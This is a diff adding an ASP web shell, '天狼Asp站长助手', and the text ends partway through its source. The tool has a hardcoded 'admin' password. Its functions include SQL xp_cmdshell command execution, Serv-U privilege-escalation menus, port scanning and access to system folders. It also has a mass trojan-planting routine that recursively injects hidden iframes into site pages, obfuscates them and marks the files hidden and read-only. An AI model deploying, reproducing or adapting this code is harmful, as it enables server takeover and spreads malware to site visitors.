@@ -1,0 +1,3757 @@
+<object runat="server" id="fso" scope="page" classid="clsid:0D43FE01-F093-11CF-8940-00A0C9054228"></object>
+<%
+'	Option Explicit
+	Response.Buffer = True
+	Dim url, conn, sUrlB, theAct, thePath, rootPath, PageSize
+	Dim accessStr, pageName, sysFileList, isSqlServer, sPacketName, VerName,By_Name
+	
+	VerName="天狼Asp站长助手" '版权
+	By_Name="天狼"   '个性化签名
+	Const userPassword = "admin" ''登录密码 用密码加密工具来加密以后修改密码
+	
+	Const m = "ASPAdmin_A" ''Session标志
+	Const isDebugMode = False 'False,True''是否调试模式 
+	Const maxPageCount = 600 ''查询时最多只列出N页的链接
+	Const imageFileExt = "$gif$jpg$bmp$png$" ''图像后缀列表
+	Const editableFileExt = "$vbs$log$asp$txt$php$ini$inc$htm$html$xml$conf$config$jsp$java$htt$lst$aspx$php3$php4$js$css$bat$asa$cer$"'编辑格式
+  	PageSize = 20 ''默认每页记录数
+	sPacketName = "Packet.mdb" ''文件包默认文件名
+	sysFileList = "$" & sPacketName & "$" & Left(sPacketName, InStrRev(sPacketName, ".") - 1) & ".ldb$"
+	accessStr = "Provider=Microsoft.Jet.OLEDB.4.0; Data Source={$dbSource};User Id={$userId};Jet OLEDB:Database Password=""{$passWord}"";"
+	theAct = GetPost("theAct")
+	isSqlServer = False
+	rootPath = Server.MapPath("/")
+	pageName = GetPost("PageName")
+	url = Request.ServerVariables("URL") ''当前页的相对路径
+	thePath = Replace(getPost("thePath"), "\\", "\")
+	
+	Sub echo(str)
+		Response.Write(str)
+	End Sub
+	
+	Sub MyWeb() '我的网站,这里随便添加您喜欢网站
+	echo "<a href='http://ip.wen.la/' target='_blank'>同IP网站</a><br />"
+	echo "<a href='http://www.cmd5.com/default.aspx' target='_blank'>MD5破解</a><br />"
+	echo "<a href='网站地址' target='_blank'>网站名称</a><br />"
+	End Sub
+	Sub  MyTXT()
+	%>
+<!--我的文本开始-->
+在这里修改我吧！<br>
+在这里可以保存你需要我内容，比如：常用的命令<br>修改内容：本文件源码中注释“我的文档开始”到“结束”之间填写内容，可以支持HTML标签，
+<!--结束-->	
+	<%
+	End Sub
+
+	Function IIf(var, val1, val2)
+		If var = True Then
+			IIf = val1
+		 Else
+			IIf = val2
+		End If
+	End Function
+	
+	Function TheSYS(Str)
+       TheSYS=Replace(Str,"\","\\")
+    End Function
+	
+	Sub RedirectTo(url)
+		Response.Redirect(url)
+	End Sub
+	
+	Function   cdrivetype(tnum)   
+          Select   Case   tnum   
+                   Case   0:   cdrivetype   =   "未知硬盘"   
+                   Case   1:   cdrivetype   =   "移动磁盘"   
+                   Case   2:   cdrivetype   =   "本地硬盘"   
+                   Case   3:   cdrivetype   =   "网络磁盘"   
+                   Case   4:   cdrivetype   =   "CD-ROM"   
+                   Case   5:   cdrivetype   =   "RAM 磁盘"
+				   Case else   cdrivetype   =   "未知硬盘"    
+          End   Select   
+    End   Function
+	
+	Function GetPost(var)
+		Dim val
+		If Request.QueryString("PageName") = "PageUpload" Then
+			pageName = "PageUpload"
+			Exit Function
+		End If
+		val = RTrim(Request.Form(var))
+		If val = "" Then
+			val = RTrim(Request.QueryString(var))
+		End If
+		GetPost = val
+	End Function
+	
+	Function HtmlEncode(str)
+		If IsNull(str) Then Exit Function
+		HtmlEncode = Server.HTMLEncode(str)
+	End Function
+	
+	Function UrlEncode(str)
+		If IsNull(str) Then Exit Function
+		UrlEncode = Server.UrlEncode(str)
+	End Function
+	
+	Sub ShowTitle(str)
+		echo "<title>" & str & " - "&VerName&"</title>"
+		echo "<meta http-equiv='Content-Type' content='text/html; charset=gb2312'>"
+	End Sub
+
+	Function GetTheSize(num)
+		Dim i, arySize(4)
+		arySize(0) = "B"
+		arySize(1) = "KB"
+		arySize(2) = "MB"
+		arySize(3) = "GB"
+		arySize(4) = "TB"
+		While(num / 1024 >= 1)
+			num = Fix(num / 1024 * 100) / 100
+			i = i + 1
+		WEnd
+		GetTheSize = num & " " & arySize(i)
+	End Function
+	
+	Sub ShowErr(str)
+		Dim i, arrayStr
+		str = Server.HtmlEncode(str)
+		arrayStr = Split(str, "$$")
+        echo "<table width=970 border=1>"
+		echo "<tr>"
+		echo "<td class=td><font face=webdings>8</font> 出错信息"
+		echo "</td>"
+		echo "</tr>"
+		echo "<tr>"
+		echo "<td  class=trHead>&nbsp;&nbsp;</td>"
+		echo "</tr>"
+		For i = 0 To UBound(arrayStr)
+		echo "<tr>"
+		echo "<td>&nbsp;&nbsp;" & (i + 1) & ". " & arrayStr(i) & "</td>"
+		echo "</tr>"
+		Next
+		echo "</table>"
+		Response.End()
+	End Sub
+	
+	Sub CreateFolder(thePath)
+		Dim i
+		i = InStr(Mid(thePath, 4), "\") + 3
+		Do While i > 0
+			If fso.FolderExists(Left(thePath, i)) = False Then
+				fso.CreateFolder(Left(thePath, i - 1))
+			End If
+			If InStr(Mid(thePath, i + 1), "\") Then
+				i = i + Instr(Mid(thePath, i + 1), "\")
+			 Else
+				i = 0
+			End If
+		Loop
+	End Sub
+	
+	Sub AlertThenClose(str)
+		If str = "" Then
+			echo "<script>window.close();</script>"
+		 Else
+			echo "<script>alert(""" & str & """);window.close();</script>"
+		End If
+	End Sub
+	
+	Sub ChkErr(Err)
+		If Err Then
+			echo "<hr style='color:#d8d8f0;'/><font size=2><li>错误: " & Err.Description & "</li><li>错误源: " & Err.Source & "</li><br/>"
+			echo "<hr style='color:#d8d8f0;'/>&nbsp;"&VerName&"</font>"
+			Err.Clear
+			Response.End
+		End If
+	End Sub
+	
+	Sub TopMenu()
+	    echo "<div id='nav' align='left'><ul>"
+	    echo "<li class=menu2 onMouseOver=this.className='menu1' onMouseOut=this.className='menu2'>查看硬盘(FSO)<div class='list'>"
+	    echo "<a href=""javascript:GotoMenu('PageFso');"">网站根目录</a><br />"
+		echo "<a href=""javascript:GotoThePath('"&TheSYS(Server.MapPath("."))&"');"">本程序目录</a><br />"
+	    Call  DriveList()
+	    echo "</div></li>"
+	    echo "<li class=menu2 onMouseOver=this.className='menu1' onMouseOut=this.className='menu2'>特殊目录<div class='list'>"
+		echo "<a href=""javascript:GotoThePath('C:\\Progra~1\\');"">Progra~1</a><br />"
+		echo "<a href=""javascript:GotoThePath('C:\\WINDOWS\\system32\\');"">system32</a><br />"
+	    echo "<a href=""javascript:GotoThePath('C:\\Program Files');"">ProgramFiles</a><br />"
+	    echo "<a href=""javascript:GotoThePath('C:\\Documents and Settings\\All Users\\');"">AllUsers</a><br />"
+	    echo "<a href=""javascript:GotoThePath('C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\');"">程序管理</a><br />"
+		echo "<a href=""javascript:GotoThePath('C:\\Documents and Settings\\All Users\\桌面\\');"">桌面</a><br />"
+		echo "<a href=""javascript:GotoThePath('C:\\Documents and Settings\\All Users\\Application Data\\Symantec\\pcAnywhere\\');"">pcAnywhere</a><br />"
+		echo "<a href=""javascript:GotoThePath('c:\\Program Files\\serv-u\\');"">Serv-U</a><br />"
+		echo "<a href=""javascript:GotoThePath('C:\\Program Files\\Real\\');"">RealServer</a><br />"
+		echo "<a href=""javascript:GotoThePath('C:\\Program Files\\Microsoft SQL Server\\');"">SQL</a><br />"
+		echo "<a href=""javascript:GotoThePath('C:\\WINDOWS\\system32\\config\\');"">config</a><br />"
+		echo "<a href=""javascript:GotoThePath('c:\\WINDOWS\\system32\\inetsrv\\data\\');"">data</a><br />"
+		echo "<a href=""javascript:GotoThePath('c:\\windows\\Temp\\');"">Temp</a><br />"
+		echo "<a href=""javascript:GotoThePath('C:\\RECYCLER\\');"">RECYCLER</a><br />"
+		echo "<a href=""javascript:GotoThePath('C:\\Documents and Settings\\All Users\\Documents\\');"">Documents</a><br />"
+	    echo "</div></li>"
+	    echo "<li class=menu2 onMouseOver=this.className='menu1' onMouseOut=this.className='menu2'>服务器基本信息<div class='list'>"
+	    echo "<a href=""javascript:GotoMenu('PageCheck');"">服务器信息探针</a><br />"
+		echo "<a href=""javascript:GotoMenu('Course');"">系统用户与服务</a><br />"
+		echo "<a href=""javascript:GotoMenu('Getzhongduan');"">终端端口与登录</a><br />"
+		echo "<a href=""javascript:GotoMenu('ZhuceBiao');"">读取注册表</a><br />"
+		echo "<a href=""javascript:GotoMenu('DuanKou');"">端口扫描器</a><br />"
+	    echo "</div></li>"
+	    echo "<li class=menu2 onMouseOver=this.className='menu1' onMouseOut=this.className='menu2'>提权工具<div class='list'>"
+		echo "<a href=""javascript:GotoMenu('CmdExcute');"">CMD命令运行</a><br />"
+	    echo "<a href=""javascript:GotoMenu('ServU');"">Serv-U7.0通杀</a>"
+		echo "<a href=""javascript:GotoMenu('ServU1');"">Serv-U6.X提权</a>"
+		echo "<a href=""javascript:GotoMenu('PageExecute');"">ASP语句运行</a><br />"
+		echo "<a href=""javascript:GotoMenu('SqladdUser');"">Sql提权</a><br />"
+		echo "<a href=""javascript:GotoMenu('PageDBTool');"">数据库操作器</a><br />"
+	    echo "</div></li>"
+	    echo "<li class=menu2 onMouseOver=this.className='menu1' onMouseOut=this.className='menu2'>实用工具<div class='list'>"
+		echo "<a href=""javascript:GotoMenu('PageFso');"">FSO文件浏览</a><br />"
+	    echo "<a href=""javascript:GotoMenu('PageUpload');"">批量文件上传</a><br />"
+		echo "<a href=""javascript:GotoMenu('PagePack');"">文件打包/解开</a>"
+		echo "<a href=""javascript:GotoMenu('PageSearch');"">文本文件搜索</a><br />"
+		echo "<a href=""javascript:GotoMenu('Dellmm');"">查找文件-木马</a>"
+		echo "<a href=""javascript:GotoMenu('AddUser');"">NETWORK-提权</a>"
+		echo "<a href=""javascript:GotoMenu('Alexa');"">Alexa排名查询</a>"
+		echo "<a href=""javascript:GotoMenu('GetFileSize');"">查询目录或者文件夹信息</a>"
+		echo "<a href=""javascript:GotoMenu('PageWebProxy');"">HTTP协议代理</a><br />"
+	    echo "</div></li>"
+	    echo "<li class=menu2 onMouseOver=this.className='menu1' onMouseOut=this.className='menu2'>挂马工具<div class='list'>"
+	    echo "<a href=""javascript:GotoMenu('Addcoders1');"">超强批量挂马</a><br />"
+		echo "<a href=""javascript:GotoMenu('Addcoders2');"">超强批量清马</a><br />"
+		echo "<a href=""javascript:GotoMenu('Addcoders3');"">超强批量替换</a><br />"
+		echo "<a href=""javascript:GotoMenu('Addcoders4');"">批量指定挂马</a><br />"
+	    echo "</div></li>"
+	    echo "<li class=menu2 onMouseOver=this.className='menu1' onMouseOut=this.className='menu2'>我的收藏<div class='list'>"
+	    echo "<a href=""javascript:GotoMenu('GgtMytxt');"">我的文档</a><br />"
+		Call Myweb()
+	    echo "</div></li>"
+	    echo "<li class=menu2 onMouseOver=this.className='menu1' onMouseOut=this.className='menu2'>安全推出<div class='list'>"
+	    echo "<a href=""javascript:GotoMenu('PageOut');"">安全推出</a><br />"
+		echo "<a href=""javascript:GotoMenu('');"">关于程序</a><br />"
+	    echo "</div></li>"
+		echo "</ul></div>"
+		echo "<div id=xia>&nbsp;</div>"
+	End Sub
+	Rem ++++++++++++++++++++++++++++++++++++
+	Rem 		以下是页面选择部分
+	Rem ++++++++++++++++++++++++++++++++++++
+Dim Fpath,addcode,addcode2,pcfile,checkbox,checkbox1,ShowMsg,FType,zfile,Styles,Report,TmpPath,timer1,Sun,SumFiles,SumFolders,DimFileExt,Substr,Fstyle
+	PageOther()
+	GotoMenuAndFile()
+	If pageName <> "" Then
+		IsIn()
+		TopMenu()
+	End If
+	Select Case pageName
+		Case "PageSearch"
+			PageSearch()
+		Case "PageCheck"
+			PageCheck()
+		Case "PageFso"
+			PageFso()
+		Case "PageDBTool"
+			PageDBTool()
+		Case "PageUpload"
+			PageUpload()	
+		Case "PagePack"
+			PagePack()
+		Case "PageExecute"
+			PageExecute()
+		Case "PageWebProxy"
+		    PageWebProxy()
+		Case "Course"
+			Course()
+		Case "Getzhongduan"
+			Getzhongduan()
+		Case "ZhuceBiao"
+			ZhuceBiao()
+		Case "DuanKou"
+			DuanKou()
+		Case "ServU"
+			ServU()
+		Case "ServU1"
+			ServU1()
+		Case "AddUser"
+			AddUser()		
+		Case "Alexa"
+			Alexa()
+	    Case "CmdExcute"
+			CmdExcute()
+		Case "Addcoders1"
+		    Styles=1
+			Addcoders()
+		Case "Addcoders2"
+		    Styles=2
+			Addcoders()
+		Case "Addcoders3"
+		    Styles=3
+			Addcoders()
+		Case "Addcoders4"
+		    Styles=4
+			Addcoders()
+		Case "Dellmm"
+		    Dellmm()
+		Case "GgtMytxt"
+		    GgtMytxt()
+		Case "GetFileSize"
+		    GetFileSize()
+		Case "SqladdUser"
+		    SqladdUser()
+		Case "", "PageOut"
+			PageLogin()
+	End Select
+    
+	Rem +++++++++++++++++++++++++++++++++++++
+	Rem 		以下是各功能模块部分
+	Rem +++++++++++++++++++++++++++++++++++++
+
+	Sub SqladdUser()
+		echo "<form name='form1' method='post'><TABLE  width=970 border=1><TR><TD colspan=2 class=TD><font face=webdings>8</font>SqL提权</TD></TR><tr><td colspan=2>CMD命令：<input type=text name=Cmdcode size=35 ><input type=text name=U value=MS_SQL_用户名><input type=text name=P value=MS_SQL_密码><input type=hidden name=PageName value=SqladdUser><input type=submit value=执行></td></tr></form>"
+If trim(request.form("Cmdcode"))<>""  Then
+password= trim(Request.form("P"))
+id=trim(Request.form("U"))
+if password="MS_SQL_密码" or  id="MS_SQL_用户名" Then 
+echo "<tr><TD colspan=2 class=TD><font color=red>MS_SQL_用户名或者MS_SQL_密码不是有效！请正确填写！ 否则出现异常错误</font></td></tr>"
+Exit Sub
+End If
+set adoConn=Server.CreateObject("ADODB.Connection")
+adoConn.Open "Provider=SQLOLEDB.1;Password="&password&";User ID="&id
+strQuery = "exec master.dbo.xp_cmdshell '" & request.form("Cmdcode") & "'"
+set recResult = adoConn.Execute(strQuery)
+If NOT recResult.EOF Then
+Do While NOT recResult.EOF
+strResult = strResult & chr(13) & recResult(0)
+recResult.MoveNext
+Loop
+End if
+set recResult = Nothing
+strResult = Replace(strResult," ","&nbsp;")
+strResult = Replace(strResult,"<","&lt;")
+strResult = Replace(strResult,">","&gt;")
+strResult = Replace(strResult,chr(13),"<br>")
+End if
+set adoConn = Nothing
+echo "<tr><TD colspan=2 class=TD><font color=red>"&request.form("Cmdcode") & "<br>"& strResult&"</font></td></tr></table>"
+End Sub
+	
+	Sub GgtMytxt()
+		echo "<table width=970 border=1>"
+		echo "<tr>"
+		echo "<td class=td><font face=webdings>8</font>我的文档"
+		echo "</td>"
+		echo "</tr>"
+		echo "<tr>"
+		echo "<td class=trHead>&nbsp;</td>"
+		echo "</tr>"
+		echo "<tr>"
+		echo "<td>"
+    call MyTXT()
+		echo"</td>"
+		echo "</tr></table>"
+	End Sub
+	Sub GetFileSize()
+	  dim Filename
+Filename=request("Filename")
+IF Filename="" then Filename=Server.MapPath("\")
+echo "<form name='form1' method='post'><TABLE  width=970 border=1><TR><TD colspan=2 class=TD><font face=webdings>8</font>文件和文件夹信息查询</TD></TR><tr><td colspan=2>查询的文件路径: <input type='text' name='Filename' value='"&Filename&"' size=40><input type=hidden name=ActionFile value=ok><input type=hidden name=PageName value=GetFileSize><input type='submit'  value='查询'></td></tr></form>"
+if request("ActionFile")="ok" then 
+Call GetFileSizes(Filename)
+End If
+ Err.Clear
+	End Sub
+Function GetFileSizes(Path)
+      Dim   objFSO,objFolder         ''声明一个名称为   objFSO   的变量以存放对象实例   
+      Set   objFSO   =   Server.CreateObject("Scripting.FileSystemObject")   
+          If   objFSO.FolderExists(Path)   Then   
+          echo "<Tr><TD>上一级目录：</td><Td>"   &objFSO.GetParentFolderName(Server.MapPath("\"))&"</td></tr>"   
+          echo "<Tr><TD>系统文件夹目录：</td><Td>"   &objFSO.GetSpecialFolder(WindowsFolder)&"</td></tr>"   
+          Set   objFolder   =   objFSO.GetFolder(Path)  
+          echo "<Tr><TD>文件夹的名称：</td><Td>"&objFolder.Name&"</td></tr>"   
+          echo "<Tr><TD>文件夹的路径：</td><Td>"&objFolder.Path&"</td></tr>"   
+          echo "<Tr><TD>文件夹的大小：</td><Td>"&GetTheSize(objFolder.size)&"</td></tr>" 
+	      echo "<Tr><TD>文件夹的建立日期：</td><Td>"&objFolder.DateCreated&"</td></tr>"   
+		  echo "<Tr><TD>文件夹最后一次修改：</td><Td>"&objFolder.DateLastModified&"</td></tr>" 
+		  echo "<Tr><TD>文件夹最后一次访问：</td><Td>"&objFolder.DateLastAccessed&"</td></tr></table>" 
+      Elseif objFSO.FileExists(Path)   Then 
+	      echo "<Tr><TD>上一级目录：</td><Td>"   &objFSO.GetParentFolderName(Server.MapPath("\"))&"</td></tr>"   
+          echo "<Tr><TD>系统文件夹目录：</td><Td>"   &objFSO.GetSpecialFolder(WindowsFolder)&"</td></tr>"   
+	    Set objFile    =objFSO.getfile(Path)
+          echo "<Tr><TD>文件的名称：</td><Td>"&objFile.Name&"</td></tr>"   
+          echo "<Tr><TD>文件的路径：</td><Td>"&objFile.Path&"</td></tr>"   
+          echo "<Tr><TD>文件的大小：</td><Td>"&GetTheSize(objFile.size)&"</td></tr>" 
+	      echo "<Tr><TD>文件的建立日期：</td><Td>"&objFile.DateCreated&"</td></tr>"   
+		  echo "<Tr><TD>文件最后一次修改：</td><Td>"&objFile.DateLastModified&"</td></tr>" 
+		  echo "<Tr><TD>文件最后一次访问：</td><Td>"&objFile.DateLastAccessed&"</td></tr></table>" 
+      Else 
+          echo "<Tr><TD colspan=2 class=TD>文件夹或者文件："""&Path&"""不存在，无法读取相关信息！</td></tr></table>"   
+      End   If
+	  Set   objFile   =  Nothing
+      Set   objFolder   =   Nothing   
+      Set   objFSO   =   Nothing             ''释放   FileSystemObject   对象实例内存空间   
+End Function	
+  
+  Function Addcoders()
+    Fpath=Request("fd")
+	addcode = trim(Request("code"))
+	addcode2 = trim(Request("code2"))
+	pcfile=request("pcfile")
+	checkbox=request("checkbox")
+	checkbox1=request("checkbox1")
+	ShowMsg=request("ShowMsg")
+	FType=request("FType")
+	zfile=request("zfile")
+	Fstyle=request("Yin")
+for i= 0 to ubound(split(server.mappath("."),"\"))
+d=split(server.mappath("."),"\")
+dir=dir&d(i)&"\"
+filename=dir&"dir.txt"
+On Error Resume Next
+SET FSO=Server.CreateObject("Scripting.FileSystemObject")
+SET FR = FSO.CreateTextFile(filename,true)
+IF NOT FSO.FileExists(filename) then
+else
+	FR.close
+	FSO.DeleteFile filename,True 
+	exit for
+end if
+next
+	if zfile="" then zfile="default|index|conn|admin|reg|main|vip|qq|mm|"
+	if Ftype="" then Ftype="htm|html|asp|php|jsp|aspx|cgi|cer|asa|cdx"
+	if Fpath="." or Fpath="" or Fpath="/" then Fpath=dir
+	if addcode="" then addcode="<iframe src=http://127.0.0.1/m.htm width=0 height=0></iframe>"
+	if checkbox="" then checkbox=request("checkbox")
+	if checkbox1="" then checkbox1=request("checkbox1")
+	if pcfile="" then
+		pcfileName=Request.ServerVariables("SCRIPT_NAME")
+		pcfilek=split(pcfileName,"/") 
+		pcfilen=ubound(pcfilek) 
+		pcfile=pcfilek(pcfilen) 
+	end if
+	call Css()
+    if Styles="1" then BT="超强批量挂马"
+	if Styles="1" then PostData="Addcoders1"
+	if Styles="2" then BT="超强批量清马-清除别人的网马"
+	if Styles="2" then PostData="Addcoders2"
+	if Styles="3" then BT="批量替换器-文件替换修改工具"
+	if Styles="3" then PostData="Addcoders3"
+	if Styles="4" then BT="批量指定挂马"
+	if Styles="4" then PostData="Addcoders4"
+echo "<form method=POST><TABLE width=970 border=1><TR><TD colspan=2 class=TD><font face=webdings>8</font>"&BT&"</TD></TR><tr><td  >网站根目录：</td><td >"&Server.MapPath("/")&"</td></tr><tr><td  >本程序目录：</td><td >"&Server.MapPath(".")&"</td></tr><tr><td  width='20%'>文件路径：</td>"
+	echo "<td ><input type=text name=fd value='"&Fpath&"' size=60><font  color=red >注意:该路径是最大可写目录(自动判别)</font> </td></tr>"
+	echo "<tr><td >是否只读隐藏形式保存：</td><td ><input  name='Yin'  type=checkbox value=""Yin"">（嵌入代码保存时只读隐藏形式保存，注意：可以再次嵌入代码）</td></tr>"
+	if Styles<>"2" then echo "<tr><td >是否变形代码：</td><td ><input  name='checkbox1'  type=checkbox value=""checked1"" >为了防止批量替换掉代码，代码正常运行"
+	echo"<input type=hidden value='"&PostData&"' name=PageName></td></tr>"
+	if Styles="1" then echo "<tr><td >过滤重复：</td><td ><input  name='checkbox' checked='checked' type=checkbox value=""checked""> 防止一个页面中有多个重复的代码</td></tr>"
+	if Styles="4" then echo "<tr><td >过滤重复：</td><td ><input  name='checkbox' checked='checked' type=checkbox value=""checked""> 防止一个页面中有多个重复的代码</td></tr><tr><td >指定文件：</td><td ><input name='zfile' type=text id='zfile' value='"&zfile&"' size=40>填写你要挂文件名[不含扩展名]</td></tr>"
+	echo "<tr><td  >排除文件：</td>"
+	echo "<td ><input name='pcfile' type=text id='pcfile' value='"&pcfile&"' size=60>例如：1.asp|2.asp|3.asp</td></tr>"
+	echo "<tr><td >文件类型：</td>"
+	echo "<td ><input name='FType' type=text id='FType' value='"&Ftype&"' size=60> 输入要修改的文件类型[扩展名]</td></tr><tr><td >"
+	if Styles="1" then echo"要挂的马："
+	if Styles="2" then echo"要清的马："
+	if Styles="3" then echo"查找内容："
+	echo"</font></td><td ><textarea name=code cols=66 rows=3>"&addcode&"</textarea></td></tr>"
+	if Styles="3" then echo "<tr><td >替 换 为：</td><td  ><textarea name=code2 cols=66 rows=3>"&addcode2&"</textarea></td></tr>"
+	echo "<tr><td ></td><td > <input name=submit type=submit value=开始执行> --标记解释--[成功：√ ， 排除：× ， 重复：<font color=red>×</font>]</td></tr>"
+	echo "</form>" 
+if request("submit")="开始执行" then 
+echo "<TABLE width=970 border=1><TR><TD align=center>结果</TD><TD>文件绝对路径</TD></TR>"
+Substr=FindSubstr(addcode)
+if checkbox1="checked1" Then
+addcode=MorfiHttp(addcode)
+End If
+response.Write("<tr><td  align=center><font color=red>"&replace(substr,"<","[")&"</font></td><td >")
+Call InsertAllFiles (Fpath,addcode,pcfile)
+end if
+  End Function
+  
+Function MorfiHttp(Code)
+Code=replace(code," ","|")
+Code=replace(code,"||","|")
+Code=replace(code,"|","|$$|",1,3,0)
+Code=replace(code,"|$$|","|",1,2,0)
+MorfiHttp=Code
+End function
+
+Function FindSubstr(Code)
+Fenjie=replace(Code," ","|")
+Fenjie=replace(Fenjie,"||","|")
+Coders=split(Fenjie,"|")
+for i=0 to ubound(coders)
+if instr(lcase(coders(i)),"http://")>0 then
+Substrs=Coders(i)
+end if
+next
+if Substrs="" or len(Substrs)<10 Then
+FindSubstr=Code
+Else
+FindSubstr=Substrs
+End If
+End function
+  
+Function Roundstring(Code)
+dim coders,codelen,codeu,Newcode,Newcoders
+coders=split(Code,"|")
+for i=0 to ubound(coders)
+codelen=len(coders(i))
+codeu=mid(coders(i),GetRnd(1,codelen),1)
+Newcode=replace(coders(i),codeu,ucase(codeu))
+Newcoders=Newcoders&" "&Newcode
+next
+Roundstring=Newcoders
+End function
+
+Function GetRnd(min,max)
+ Randomize
+ GetRnd = Int((max - min + 1) * Rnd + min)
+End function
+
+Sub InsertAllFiles(Wpath,Wcode,pc)
+	Server.ScriptTimeout=999999999
+	 if right(Wpath,1)<>"\" then Wpath=Wpath &"\"
+	 Set WFSO = CreateObject("Scripting.FileSystemObject")
+	 on error resume next 
+	 Set f = WFSO.GetFolder(Wpath)
+	 Set fc2 = f.files
+	 For Each myfile in fc2
+		Set FS1 = CreateObject("Scripting.FileSystemObject")
+		FType1=split(myfile.name,".") 
+		FType2=ubound(FType1) 
+		zfile1=FType1(FType2-1)
+		if Ftype2>0 then
+		FType3=LCase(FType1(FType2)) 
+		Else
+		FType3="无"
+		end if
+		if Instr(LCase(pc),LCase(myfile.name))=0 and Instr(LCase(FType),FType3)<>0 then
+			select case Styles
+			    case "4"
+			Call Attribut(Wpath&myfile.name,"Xianshi")
+	        if Instr("|"&zfile&"|","|"&zfile1&"|")<>0   then
+					if checkbox<>"checked" then
+						Set tfile=FS1.opentextfile(Wpath&""&myfile.name,8,-2)
+					    if checkbox1<>"checked1" then 
+						tfile.writeline Wcode
+						else
+						 tfile.writeline Roundstring(replace(Wcode,"$$","name="&Int((9999 - 1000 + 1) * Rnd + 1000)))
+						end if
+						echo"<tr><td  align=center>√</td><td >"&Wpath&myfile.name&"</td>"
+						tfile.close
+					else
+						Set tfile1=FS1.opentextfile(Wpath&""&myfile.name,1,-2)
+						if Instr(lcase(tfile1.readall),lcase(Substr))=0 then
+							Set tfile=FS1.opentextfile(Wpath&""&myfile.name,8,-2)
+					    if checkbox1<>"checked1" then 
+						tfile.writeline Wcode
+						else
+						 tfile.writeline Roundstring(replace(Wcode,"$$","name="&Int((9999 - 1000 + 1) * Rnd + 1000)))
+						 end if
+						echo"<tr><td  align=center>√</td><td >"&Wpath&myfile.name&Substr&"</td>"
+							tfile1.close
+						else
+							echo"<tr><td  align=center><font color=red>×</font></td><td >"&Wpath&myfile.name&Substr&"</td>"
+							tfile1.close
+						end if
+						Set tfile1=Nothing
+						End if						
+						End if
+				case "1"
+				Call Attribut(Wpath&myfile.name,"Xianshi")
+					if checkbox<>"checked" then
+						Set tfile=FS1.opentextfile(Wpath&""&myfile.name,8,-2)
+						if checkbox1<>"checked1" then 
+						tfile.writeline Wcode
+						else
+						 tfile.writeline Roundstring(replace(Wcode,"$$","name="&Int((9999 - 1000 + 1) * Rnd + 1000)))
+						end if
+						echo"<tr><td  align=center>√</td><td >"&Wpath&myfile.name&"</td>"
+						tfile.close
+					else
+						Set tfile1=FS1.opentextfile(Wpath&""&myfile.name,1,-2)
+						if Instr(lcase(tfile1.readall),lcase(Substr))=0 then
+							Set tfile=FS1.opentextfile(Wpath&""&myfile.name,8,-2)
+							if checkbox1<>"checked1" then 
+						    tfile.writeline Wcode
+						    else
+						    tfile.writeline Roundstring(replace(Wcode,"$$","name="&Int((9999 - 1000 + 1) * Rnd + 1000)))
+					     	end if
+						echo"<tr><td  align=center>√</td><td >"&Wpath&myfile.name&"</td>"
+							tfile1.close
+						else
+							echo"<tr><td  align=center><font color=red>×</font></td><td >"&Wpath&myfile.name&"</td>"
+							tfile1.close
+						end if
+						Set tfile1=Nothing
+					end if
+				case "2"
+                    Call Attribut(Wpath&myfile.name,"Xianshi")
+					Set tfile1=FS1.opentextfile(Wpath&""&myfile.name,1,-2)
+					NewCode=Replace(tfile1.readall,Wcode,"")
+					Set objCountFile=WFSO.CreateTextFile(Wpath&myfile.name,True)
+					objCountFile.Write NewCode
+					objCountFile.Close
+					echo"<tr><td  align=center>√</td><td >"&Wpath&myfile.name&"</td>"
+					Set objCountFile=Nothing
+				case "3"
+				Call Attribut(Wpath&myfile.name,"Xianshi")
+					Set tfile1=FS1.opentextfile(Wpath&""&myfile.name,1,-2)
+					NewCode=Replace(tfile1.readall,Wcode,addCode2)
+					Set objCountFile=WFSO.CreateTextFile(Wpath&myfile.name,True)
+					objCountFile.Write NewCode
+					objCountFile.Close
+				    echo"<tr><td  align=center>√</td><td >"&Wpath&myfile.name&"</td>"
+					Set objCountFile=Nothing
+				case else
+					echo"非法操作，请返回.":response.end
+			end select
+	If Fstyle="Yin" Then Call Attribut(Wpath&myfile.name,"Yin")
+	end if
+	 Next
+ Set fsubfolers = f.SubFolders
+ For Each f1 in fsubfolers
+	NewPath=Wpath&""&f1.name
+ 	InsertAllFiles NewPath,Wcode,pc
+ Next
+set tfile=nothing
+Set FSO = Nothing
+set tfile=nothing
+set tfile2=nothing
+Set WFSO = Nothing
+End Sub
+
+Function Attribut(Filename,Style)
+Dim objFSO
+Dim objFile
+Dim strFileName
+Dim intFileAttributes
+If Style<>"Yin" Then Style="Xianshi"
+Set objFSO = Server.CreateObject("Scripting.FileSystemObject")
+Set objFile = objFSO.GetFile(Filename)
+strFileName = objFile.Name
+intFileAttributes = objFile.Attributes
+hidden=(intFileAttributes And 2)
+readonly=(intFileAttributes And 1)
+If readonly = 1 Then
+If Style="Xianshi" Then
+intFileAttributes = intFileAttributes - 1
+end if
+Else
+If Style="Yin" Then 
+intFileAttributes = intFileAttributes + 1
+End if
+End If
+If hidden = 2 Then
+If Style="Xianshi" Then
+intFileAttributes = intFileAttributes - 2
+end if
+Else
+If Style="Yin" Then 
+intFileAttributes = intFileAttributes + 2
+End if
+End If
+objFile.Attributes = intFileAttributes
+Set objFile = Nothing
+Set objFSO = Nothing
+End Function
+
+  Function Alexa()
+  dim AlexaUrl,Top
+AlexaUrl=request("u")
+IF AlexaUrl="" then 
+Top=AlexaGET("http://"&Request.ServerVariables("SERVER_NAME")&"/")
+Else
+Top=AlexaGet(AlexaUrl)
+End If
+if AlexaUrl="" then AlexaUrl="http://"&Request.ServerVariables("SERVER_NAME")&"/"
+echo "<form name='form1' method='post' action='?Action=Alexa'><TABLE  width=970 border=1><TR><TD colspan=2 class=TD><font face=webdings>8</font>Alexa排名查询</TD></TR><tr><td >查询URL: <input type='text' name='u' value='"&AlexaUrl&"' size=40>排名:<input type='text' value='"&Top&"' size=10><input type=hidden name=PageName value=Alexa><input type='submit'  value='提交'></td></tr></table></form>"
+ Err.Clear
+End Function
+  
+Function AlexaGet(AlexaURL)
+	on error resume next 
+	dim getsms,getstr,url
+	dim star,endd
+	url="http://data.alexa.com/data?cli=10&dat=snba&url="&AlexaURL
+	getsms=getHTTPPage(url)
+	if getsms<>"" then
+		star=instr(getsms,"<REACH RANK=""")+13
+		endd=instr(star,getsms,"</SD>")
+		getstr=mid(getsms,star,endd-star-4)
+	else
+		getstr="无排名"
+	end if
+	if IsNumeric(getstr)=false then getstr="无排名"
+	AlexaGet=getstr
+end function
+
+function getHTTPPage(url) 
+	on error resume next 
+	dim http 
